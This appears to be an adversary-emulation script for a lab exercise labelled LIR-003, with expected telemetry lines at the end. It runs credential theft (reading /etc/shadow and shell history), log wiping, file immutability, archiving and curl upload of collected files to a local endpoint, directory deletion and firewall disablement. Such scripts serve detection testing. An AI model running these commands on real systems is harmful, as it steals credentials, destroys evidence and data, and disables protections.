# LIR-003: Credential access, defense evasion, impact (controlled lab run)
cat /etc/shadow
cat ~/.bash_history 2>/dev/null | tail -5
mkdir -p /tmp/lab-lynx/target
echo "sensitive-data" > /tmp/lab-lynx/target/data.txt
journalctl --vacuum-size=1M 2>&1 | head -3
truncate -s 0 /tmp/lab-lynx/target/events.log 2>/dev/null; touch /tmp/lab-lynx/target/events.log
chattr +i /tmp/lab-lynx/target/data.txt
tar -czf /tmp/lab-lynx/collected.tgz /etc/hostname /etc/hosts /tmp/lab-lynx/target/data.txt
curl -T /tmp/lab-lynx/collected.tgz http://127.0.0.1:8099/upload
rm -rf /tmp/lab-lynx/target
ufw disable
FILE:/tmp/lab-lynx/collected.tgz:creation
NET:127.0.0.1:0:127.0.0.1:8099:curl
